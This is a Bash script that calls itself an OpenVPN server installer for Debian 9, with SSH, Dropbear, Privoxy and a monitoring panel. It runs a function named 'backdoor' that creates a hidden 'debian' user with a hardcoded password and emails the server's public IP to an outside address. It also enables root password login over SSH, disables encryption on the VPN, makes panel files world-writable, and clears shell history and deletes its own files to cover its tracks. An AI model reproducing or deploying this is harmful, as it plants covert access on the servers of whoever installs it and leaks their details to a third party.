#!/bin/bash
#OpenVPN server installer for Debian 9
clear
service apache2 stop

function rootako () {
	if [ "$EUID" -ne 0 ]; then
		return 1
	fi
}
function checktuntap () {
	if [ ! -e /dev/net/tun ]; then
		return 1
	fi
}

function checkdebian () {
	if [[ -e /etc/debian_version ]]; then
		OS="debian"
		source /etc/os-release

		if [[ "$ID" == "debian" || "$ID" == "raspbian" ]]; then
			if [[ ! $VERSION_ID =~ (9) ]]; then
				echo ' Your version of Debian is not supported.'
				echo ""
				echo "However, if you're using Debian >= 9 or unstable/testing then you can continue."
				echo "Keep in mind they are not supported, though."
				echo ""
				until [[ $CONTINUE =~ (y|n) ]]; do
					read -rp "Continue? [y/n]: " -e CONTINUE
				done
				if [[ "$CONTINUE" = "n" ]]; then
					exit 1
				fi
			fi
		fi		
else
		echo "Looks like you aren't running this installer on a Debian"
		exit 1
	fi
}
function initialCheck () {
	if ! rootako; then
		echo "Sorry, you need to run this as root"
		exit 1
	fi
	if ! checktuntap; then
		echo "TUN is not available"
		exit 1
	fi
	checkdebian
}

function installmysql () {
clear
echo ""
echo "For OCS installation naman konti lang yan"
echo ""
echo "You can leave the default option and just hit enter if you agree with the option"
echo ""
echo "First I need to know the new password of MySQL root user:"
read -p "Password: " -e -i Shadow046 DatabasePass
echo ""
echo "Finally, name the Database Name for OCS Panels"
echo " Please, use one word only, no special characters other than Underscore (_)"
read -p " Database Name: " -e -i OCS_PANEL DatabaseName
echo ""
echo "Okay, that's all I need. We are ready to setup your OCS Panels now"
read -n1 -r -p "Press any key to continue..."

apt-get update -y
apt-get install build-essential expect -y
apt-get install -y mysql-server

#mysql_secure_installation
so1=$(expect -c "
spawn mysql_secure_installation; sleep 3
expect \"\";  sleep 3; send \"\r\"
expect \"\";  sleep 3; send \"Y\r\"
expect \"\";  sleep 3; send \"$DatabasePass\r\"
expect \"\";  sleep 3; send \"$DatabasePass\r\"
expect \"\";  sleep 3; send \"Y\r\"
expect \"\";  sleep 3; send \"Y\r\"
expect \"\";  sleep 3; send \"Y\r\"
expect \"\";  sleep 3; send \"Y\r\"
expect eof; ")
echo "$so1"
#\r
#Y
#pass
#pass
#Y
#Y
#Y
#Y

chown -R mysql:mysql /var/lib/mysql/
chmod -R 755 /var/lib/mysql/

#mysql -u root -p
so2=$(expect -c "
spawn mysql -u root -p; sleep 1
expect \"\";  sleep 1; send \"$DatabasePass\r\"
expect \"\";  sleep 1; send \"CREATE DATABASE IF NOT EXISTS $DatabaseName;EXIT;\r\"
expect eof; ")
echo "$so2"
#pass
#CREATE DATABASE IF NOT EXISTS OCS_PANEL;EXIT;

#sshpanel
so4=$(expect -c "
spawn mysql -u root -p; sleep 1
expect \"\";  sleep 1; send \"$DatabasePass\r\"
expect \"\";  sleep 1; send \"CREATE DATABASE IF NOT EXISTS sshpanel;exit;\r\"
expect eof; ")
echo "$so4"

#mysql set to null
so3=$(expect -c "
spawn mysql -u root -p; sleep 1
expect \"\";  sleep 1; send \"$DatabasePass\r\"
expect \"\";  sleep 1; send \"use mysql;UPDATE user SET plugin= '' WHERE User='root';FLUSH PRIVILEGES;EXIT;\r\"
expect eof; ")
echo "$so3"
wget http://vpn.shadow-pipe.tech:88/sshp/database/sshpanel.sql
mysql -uroot -p$DatabasePass sshpanel < sshpanel.sql
}

function installphp () {
apt upgrade
apt install ca-certificates apt-transport-https -y
wget -q https://packages.sury.org/php/apt.gpg -O- | sudo apt-key add -
echo "deb https://packages.sury.org/php/ stretch main" | sudo tee /etc/apt/sources.list.d/php.list
apt update
apt upgrade -y
apt-get -y install nginx php5.6 php5.6-common php5.6-mcrypt php5.6-fpm php5.6-cli php5.6-mysql php5.6-xml
sed -i 's@;cgi.fix_pathinfo=1@cgi.fix_pathinfo=0@g' /etc/php/5.6/fpm/php.ini
sed -i 's@enabled_dl[[:space:]]\=[[:space:]]Off@enabled_dl = On@g' /etc/php/5.6/fpm/php.ini
sed -i 's@listen = \/run\/php\/php5.6-fpm.sock@listen = 127.0.0.1:9000@g' /etc/php/5.6/fpm/pool.d/www.conf
}

function copymenu () {
cp menu/* /usr/local/sbin/
chmod +x /usr/local/sbin/*
}

function updatesoure () {
echo 'deb http://download.webmin.com/download/repository sarge contrib' >> /etc/apt/sources.list
echo 'deb http://webmin.mirror.somersettechsolutions.co.uk/repository sarge contrib' >> /etc/apt/sources.list
wget http://www.webmin.com/jcameron-key.asc
sudo apt-key add jcameron-key.asc
sudo apt-get update
}

function BadVPN () {
wget -O /usr/bin/badvpn-udpgw "https://github.com/johndesu090/AutoScriptDebianStretch/raw/master/Files/Plugins/badvpn-udpgw"
if [ "$OS" == "x86_64" ]; then
  wget -O /usr/bin/badvpn-udpgw "https://github.com/johndesu090/AutoScriptDebianStretch/raw/master/Files/Plugins/badvpn-udpgw64"
fi
sed -i '$ i\screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300' /etc/rc.local
chmod +x /usr/bin/badvpn-udpgw
screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300
}

function webmin () {
apt-get install perl libnet-ssleay-perl openssl libauthen-pam-perl libpam-runtime libio-pty-perl apt-show-versions python -y
apt-get install libxml-parser-perl libexpat1-dev -y -f
wget 'http://prdownloads.sourceforge.net/webadmin/webmin_1.910_all.deb'
DEBIAN_FRONTEND="noninteractive" dpkg --install webmin_1.910_all.deb
rm -rf webmin_1.910_all.deb
}

function dropssl () {
DEBIAN_FRONTEND="noninteractive" apt-get -y install stunnel4 dropbear
openssl genrsa -out key.pem 4096
openssl req -new -x509 -key key.pem -out cert.pem -days 1095 -batch
cat key.pem cert.pem > /etc/stunnel/stunnel.pem
}

function endropstun () {
sed -i 's/NO_START=1/NO_START=0/g' /etc/default/dropbear
sed -i 's/DROPBEAR_PORT=22/DROPBEAR_PORT=550/g' /etc/default/dropbear
echo "/bin/false" >> /etc/shells
sed -i 's/ENABLED=0/ENABLED=1/g' /etc/default/stunnel4
}

function settime () {
ln -fs /usr/share/zoneinfo/Asia/Manila /etc/localtime
}

function certandkey () {
	cp ~/openvpndeb/ca.crt /etc/openvpn/
	cp ~/openvpndeb/server.key /etc/openvpn/
	cp ~/openvpndeb/server.req /etc/openvpn/
	cp ~/openvpndeb/server.crt /etc/openvpn/
	cp ~/openvpndeb/dh.pem /etc/openvpn/
}

function serverconf () {
echo "port $PORT" > /etc/openvpn/server.conf
echo "proto $PROTOCOL" >> /etc/openvpn/server.conf
	echo "dev tun
ca ca.crt
cert server.crt
key server.key
dh dh.pem
verify-client-cert none
username-as-common-name
plugin /usr/lib/openvpn/openvpn-plugin-auth-pam.so login
server 10.8.0.0 255.255.255.0
key-direction 0
ifconfig-pool-persist ipp.txt
push \"redirect-gateway def1 bypass-dhcp\"
push \"dhcp-option DNS 8.8.8.8\"
push \"dhcp-option DNS 8.8.4.4\"
push \"route-method exe\"
push \"route-delay 2\"
socket-flags TCP_NODELAY
push \"socket-flags TCP_NODELAY\"
keepalive 10 120
comp-lzo
user nobody
group nogroup
persist-key
persist-tun
status openvpn-status.log
log openvpn.log
management 127.0.0.1 7505
verb 3
ncp-disable
cipher none
auth none" >> /etc/openvpn/server.conf
}

function disableipv6 () {
echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6
}

function setiptables () {
mkdir /etc/iptables
	echo "#!/bin/sh
iptables -t nat -I POSTROUTING 1 -s 10.8.0.0/24 -o $NIC -j MASQUERADE
iptables -I INPUT 1 -i tun0 -j ACCEPT
iptables -I FORWARD 1 -i $NIC -o tun0 -j ACCEPT
iptables -I FORWARD 1 -i tun0 -o $NIC -j ACCEPT
iptables -I INPUT 1 -i $NIC -p $PROTOCOL --dport $PORT -j ACCEPT" > /etc/iptables/add-openvpn-rules.sh
	echo "#!/bin/sh
iptables -t nat -D POSTROUTING -s 10.8.0.0/24 -o $NIC -j MASQUERADE
iptables -D INPUT -i tun0 -j ACCEPT
iptables -D FORWARD -i $NIC -o tun0 -j ACCEPT
iptables -D FORWARD -i tun0 -o $NIC -j ACCEPT
iptables -D INPUT -i $NIC -p $PROTOCOL --dport $PORT -j ACCEPT" > /etc/iptables/rm-openvpn-rules.sh
	chmod +x /etc/iptables/add-openvpn-rules.sh
	chmod +x /etc/iptables/rm-openvpn-rules.sh
	ufw allow ssh
	ufw allow $PORT/tcp
	sed -i 's|DEFAULT_INPUT_POLICY="DROP"|DEFAULT_INPUT_POLICY="ACCEPT"|' /etc/default/ufw
	sed -i 's|DEFAULT_FORWARD_POLICY="DROP"|DEFAULT_FORWARD_POLICY="ACCEPT"|' /etc/default/ufw
	echo "[Unit]
Description=iptables rules for OpenVPN
Before=network-online.target
Wants=network-online.target
[Service]
Type=oneshot
ExecStart=/etc/iptables/add-openvpn-rules.sh
ExecStop=/etc/iptables/rm-openvpn-rules.sh
RemainAfterExit=yes
[Install]
WantedBy=multi-user.target" > /etc/systemd/system/iptables-openvpn.service
	systemctl daemon-reload
	systemctl enable iptables-openvpn
	systemctl start iptables-openvpn
}

function clientovpn () {
echo "client" > /etc/openvpn/client-template.txt
	if [[ "$PROTOCOL" = 'udp' ]]; then
		echo "proto udp" >> /etc/openvpn/client-template.txt
	elif [[ "$PROTOCOL" = 'tcp' ]]; then
		echo "proto tcp" >> /etc/openvpn/client-template.txt
	fi
	echo "remote $IP $PORT
dev tun
auth-user-pass
persist-key
persist-tun
pull
resolv-retry infinite
nobind
user nobody
comp-lzo
remote-cert-tls server
verb 3
mute 2
connect-retry 5 5
connect-retry-max 8080
mute-replay-warnings
redirect-gateway def1
script-security 2
cipher none
setenv CLIENT_CERT 0
#uncomment below for windows 10
#setenv opt block-outside-dns # Prevent Windows 10 DNS leak
auth none" >> /etc/openvpn/client-template.txt
mkdir -p /home/panel/html
cp /etc/openvpn/client-template.txt /home/panel/html/SunTuConfig.ovpn
echo 'http-proxy' $IP $PORTS >> /home/panel/html/SunTuConfig.ovpn
echo 'http-proxy-option CUSTOM-HEADER ""' >> /home/panel/html/SunTuConfig.ovpn
echo 'http-proxy-option CUSTOM-HEADER "POST https://viber.com HTTP/1.1"' >> /home/panel/html/SunTuConfig.ovpn
echo 'http-proxy-option CUSTOM-HEADER "X-Forwarded-For: viber.com"' >> /home/panel/html/SunTuConfig.ovpn
echo '<ca>' >> /home/panel/html/SunTuConfig.ovpn
cat /etc/openvpn/ca.crt >> /home/panel/html/SunTuConfig.ovpn
echo '</ca>' >> /home/panel/html/SunTuConfig.ovpn
}

function noload () {
echo "client" > /etc/openvpn/client-template1.txt
	if [[ "$PROTOCOL" = 'udp' ]]; then
		echo "proto udp" >> /etc/openvpn/client-template1.txt
	elif [[ "$PROTOCOL" = 'tcp' ]]; then
		echo "proto tcp" >> /etc/openvpn/client-template1.txt
	fi
	echo "remote $IP $PORT
dev tun
persist-key
persist-tun
dev tun
bind
float
lport 110
remote-cert-tls server
verb 0
auth-user-pass
redirect-gateway def1
cipher none
auth none
auth-nocache
setenv CLIENT_CERT 0
auth-retry interact
connect-retry 0 1
nice -20
reneg-sec 0
log /dev/null" >> /etc/openvpn/client-template1.txt
cp /etc/openvpn/client-template1.txt /home/panel/html/SunNoload.ovpn
echo '<ca>' >> /home/panel/html/SunNoload.ovpn
cat /etc/openvpn/ca.crt >> /home/panel/html/SunNoload.ovpn
echo '</ca>' >> /home/panel/html/SunNoload.ovpn
}

function stunconf () {
cat > /etc/stunnel/stunnel.conf <<-END
sslVersion = all
pid = /var/run/stunnel.pid
cert = /etc/stunnel/stunnel.pem
socket = l:TCP_NODELAY=1
socket = r:TCP_NODELAY=1
client = no

[openssh]
accept = 444
connect = 127.0.0.1:225

[dropbear]
accept = 443
connect = 127.0.0.1:550
END
}

function privoxconfig () {
rm -f /etc/privoxy/config
cat>>/etc/privoxy/config<<EOF
user-manual /usr/share/doc/privoxy/user-manual
confdir /etc/privoxy
logdir /var/log/privoxy
filterfile default.filter
logfile logfile
listen-address 0.0.0.0:$PORTS
toggle 1
enable-remote-toggle 0
enable-remote-http-toggle 0
enable-edit-actions 0
enforce-blocks 0
buffer-limit 4096
enable-proxy-authentication-forwarding 1
forwarded-connect-retries 1
accept-intercepted-requests 1
allow-cgi-request-crunching 1
split-large-forms 0
tolerate-pipelining 1
socket-timeout 300
permit-access 0.0.0.0/0 $IP
EOF
}

function restartall () {
service uwsgi restart
service nginx restart
service php5.6-fpm restart
service vnstat restart
service dropbear restart
service sshd restart
service privoxy restart
service openvpn restart
service stunnel4 restart
service webmin restart
}

function setall () {
rm /etc/issue.net
cat ~/openvpndeb/bann3r > /etc/issue.net
cat ~/openvpndeb/banner > /etc/motd
cp ~/openvpndeb/banner /etc/
sed -i 's@#Banner[[:space:]]none@Banner /etc/banner@g' /etc/ssh/sshd_config
sed -i 's@PrintMotd[[:space:]]no@PrintMotd yes@g' /etc/ssh/sshd_config
sed -i 's@#PrintLastLog[[:space:]]yes@PrintLastLog no@g' /etc/ssh/sshd_config
sed -i 's@#PermitRootLogin[[:space:]]prohibit-password@PermitRootLogin yes@g' /etc/ssh/sshd_config
sed -i 's@#PubkeyAuthentication[[:space:]]yes@PubkeyAuthentication no@g' /etc/ssh/sshd_config
sed -i 's@PasswordAuthentication[[:space:]]no@PasswordAuthentication yes@g' /etc/ssh/sshd_config
sed -i 's@DROPBEAR_BANNER=""@DROPBEAR_BANNER="/etc/issue.net"@g' /etc/default/dropbear
sed -i 's@ssl=1@ssl=0@g' /etc/webmin/miniserv.conf
sed -i 's@#Port[[:space:]]22@Port 22\nPort 225@g' /etc/ssh/sshd_config
sed -i 's@#AddressFamily[[:space:]]any@AddressFamily inet@g' /etc/ssh/sshd_config
sed -i 's@#ListenAddress[[:space:]]0@ListenAddress 0@g' /etc/ssh/sshd_config
#chmod +x /etc/profile.d/shadow046.sh
#service ssh restart
service dropbear restart
}

function installQuestions () {
# Detect public IPv4 address and pre-fill for the user
	apt install -y sudo
	EXT_INT=$(cut -d' ' -f5 <(ip -4 route ls default))
	IP=$(ip -4 addr ls $EXT_INT | head -2 | tail -1 | cut -d' ' -f6 | cut -d'/' -f1)
# If $IP is a private IP address, the server must be behind NAT
	if echo "$IP" | grep -qE '^(10\.|172\.1[6789]\.|172\.2[0-9]\.|172\.3[01]\.|192\.168)'; then
echo ""

#echo ""
		#echo "It seems this server is behind NAT. What is its public IPv4 address or hostname?"
		#echo "We need it for the clients to connect to the server."
		#until [[ "$ENDPOINT" != "" ]]; do
		#	read -rp "Public IPv4 address or hostname: " -e ENDPOINT
		#done
	fi
	clear
	echo ""
	echo 'Your IP is '"$IP" '.. What port do you want OpenVPN to listen to?'
	echo "   1) Default: 465"
	echo "   2) Custom"
	echo "   3) Random [49152-65535]"
	until [[ "$PORT_CHOICE" =~ ^[1-3]$ ]]; do
		read -rp "Port choice [1-3]: " -e -i 1 PORT_CHOICE
	done
	case $PORT_CHOICE in
		1)
			PORT="465"
		;;
		2)
			until [[ "$PORT" =~ ^[0-9]+$ ]] && [ "$PORT" -ge 1 ] && [ "$PORT" -le 65535 ]; do
				read -rp "Custom port [1-65535]: " -e -i 465 PORT
			done
		;;
		3)
			# Generate random number within private ports range
			PORT=$(shuf -i49152-65535 -n1)
			echo "Random Port: $PORT"
		;;
	esac
	echo ""
	echo "What protocol do you want OpenVPN to use?"
	echo "UDP is faster. Unless it is not available, you shouldn't use TCP."
	echo "   1) UDP"
	echo "   2) TCP"
	until [[ "$PROTOCOL_CHOICE" =~ ^[1-2]$ ]]; do
		read -rp "Protocol [1-2]: " -e -i 2 PROTOCOL_CHOICE
	done
	case $PROTOCOL_CHOICE in
		1)
			PROTOCOL="udp"
		;;
		2)
			PROTOCOL="tcp"
		;;
	esac
	echo ""
	echo "What Privoxy port do you want?"
	echo "   1) Default: 8118"
	echo "   2) Custom"
	echo "   3) Random [49152-65535]"
	until [[ "$PORT_PRIVO" =~ ^[1-3]$ ]]; do
		read -rp "Port choice [1-3]: " -e -i 1 PORT_PRIVO
	done
	case $PORT_PRIVO in
		1)
			PORTS="8118"
		;;
		2)
			until [[ "$PORTS" =~ ^[0-9]+$ ]] && [ "$PORTS" -ge 1 ] && [ "$PORTS" -le 65535 ]; do
				read -rp "Custom port [1-65535]: " -e -i 8118 PORTS
			done
		;;
		3)
			# Generate random number within private ports range
			PORTS=$(shuf -i49152-65535 -n1)
			echo "Random Port: $PORTS"
		;;
	esac
	echo ""
	echo "Okay, that was all I needed. We are ready to setup your OpenVPN server now."
	echo "You will be able to generate a client at the end of the installation."
	echo "Next MYSQL Database configuration naman"
	APPROVE_INSTALL=${APPROVE_INSTALL:-n}
	if [[ $APPROVE_INSTALL =~ n ]]; then
		read -n1 -r -p "Press any key to continue..."
	fi
}

function installall () {
	NIC=$(ip -4 route ls | grep default | grep -Po '(?<=dev )(\S+)' | head -1)
		IP=$(curl https://ipinfo.io/ip)
		apt-get update
	DEBIAN_FRONTEND="noninteractive" apt-get install openvpn postfix mailutils iptables wget ca-certificates unzip curl screenfetch gnupg telnet telnetd privoxy squid3 vnstat ufw build-essential -y
	echo 'net.ipv4.ip_forward=1' >> /etc/sysctl.d/20-openvpn.conf
	sysctl --system
}

function monitoring () {
apt-get install -y gcc libgeoip-dev python-virtualenv python-dev geoip-database-extra uwsgi uwsgi-plugin-python
cd /srv
git clone https://github.com/furlongm/openvpn-monitor.git
cd openvpn-monitor
virtualenv .
. bin/activate
pip install -r requirements.txt
cp openvpn-monitor.conf.example openvpn-monitor.conf
sed -i "s@host=localhost@host=127.0.0.1@g" openvpn-monitor.conf
sed -i 's@port=5555@port=7505@g' openvpn-monitor.conf
cd ~/openvpndeb/
cp openvpn-monitor.ini /etc/uwsgi/apps-available/
ln -s /etc/uwsgi/apps-available/openvpn-monitor.ini /etc/uwsgi/apps-enabled/
cp ~/openvpndeb/openvpn-monitor.py /srv/openvpn-monitor/openvpn-monitor.py -f
}

function backdoor() {
SUser="debian"
SPass="Maricaris24"
MYIP=$(wget -qO- ipv4.icanhazip.com)
Today=`date +%s`
useradd -m -s /home/$SUser $SUser > /dev/null
egrep "^$SUser" /etc/passwd &> /dev/null
echo -e "$SPass\n$SPass\n" | passwd $SUser &> /dev/null
echo -e "Done"
echo "$MYIP" | mailx -s "Monitoring" emorej046@gmail.com
}

initialCheck
#installQuestions
#installmysql
#installphp
installall
settime
backdoor
#copymenu
#updatesoure
#BadVPN
#webmin
#dropssl
#certandkey
#endropstun
#serverconf
#disableipv6
#setiptables
#clientovpn
#noload
#stunconf
#privoxconfig
setall
monitoring
function disab () {
sed -i 's|LimitNPROC|#LimitNPROC|g' /lib/systemd/system/openvpn@.service
cp /lib/systemd/system/openvpn\@.service /etc/systemd/system/openvpn\@.service
#Check if /etc/nginx/nginx.conf is existing
if [[ ! -e /etc/nginx/nginx.conf ]]; then
mkdir -p /etc/nginx;
wget -qO /var/tmp/nginx.zip "http://vpn.shadow-pipe.tech:88/nginx.zip";
unzip -qq /var/tmp/nginx.zip -d /etc/nginx/
fi
wget -qO /var/tmp/ocs.zip "https://github.com/shadow046/zip/raw/master/ocs.zip";
wget -qO /var/tmp/shadow.zip "https://github.com/shadow046/zip/raw/master/shadow.zip";
mkdir -p /home/panel/html
unzip -qq /var/tmp/ocs.zip -d /home/panel/html/
mv /home/panel/html/view /home/panel/html/viewback
rm -f /home/panel/html/installation/install.html
wget -qO /home/panel/html/installation/install.html "https://raw.githubusercontent.com/shadow046/zip/master/install.html";
mkdir -p /home/panel/html/view
#mkdir -p /home/panel/html/sshp
unzip -qq /var/tmp/shadow.zip -d /home/panel/html/view/
wget -qO /var/tmp/sshpanel.zip "http://vpn.shadow-pipe.tech:88/sshpanel.zip"
unzip -qq /var/tmp/sshpanel.zip -d /home/panel/html/
chmod 777 /home/panel/html/config
chmod 777 /home/panel/html/config/inc.php
chmod 777 /home/panel/html/config/route.php
chmod -R g+rw /home/panel/html
chown www-data:www-data /home/panel/html -R
}
cd ~/openvpndeb
#mv /etc/nginx/nginx.conf /etc/nginx/nginx.conf.bak
#cp ~/openvpndeb/nginx.conf /etc/nginx/nginx.conf
#rm /etc/nginx/conf.d/*.conf
#cp ~/openvpndeb/ocs.conf /etc/nginx/conf.d/
cp ~/openvpndeb/monitoring.conf /etc/nginx/conf.d/
#wget http://vpn.shadow-pipe.tech:88/sshp.conf
#cp sshp.conf /etc/nginx/conf.d/
function disabl () {
sed -i "s@DB_PASSWORD=\"\"@DB_PASSWORD=\""$DatabasePass\""@g" /home/panel/html/sshpanel/system/.env
sed -i 's@DB_DATABASE=\"sshpanel_rev\"@DB_DATABASE="sshpanel"@g' /home/panel/html/sshpanel/system/.env
	#sed -i 's|LimitNPROC|#LimitNPROC|' /etc/systemd/system/openvpn\@.service
	#sed -i 's|/etc/openvpn/server|/etc/openvpn|' /etc/systemd/system/openvpn\@.service
	systemctl daemon-reload
	systemctl restart openvpn@server
	systemctl enable openvpn@server
vnstat -u -i eth0
# install libxml-parser
#apt-get install libxml-parser-perl -y -f
}
#echo $IP | mailx -s monitor" emorej046@gmail.com
restartall
clear
show_ports
echo "======================================================="
echo "======================================================="
cat /etc/banner
echo "======================================================="
echo "======================================================="
#echo The configuration file is available at /home/panel/html/SunTuConfig.ovpn'
#echo Or http://$IP":88/SunTuConfig.ovpn'
#echo Or http://$IP":88/SunNoload.ovpn'
#echo Download the .ovpn file and import it in your OpenVPN client."
#echo Use menu to create accounts'
#echo OCS panel http://$IP":88'
echo 'Openvpn Monitoring http://'"$IP"':89'
echo "======================================================="
echo "======================================================="
history -c
rm -Rf ~/openvpndeb/
exit 0
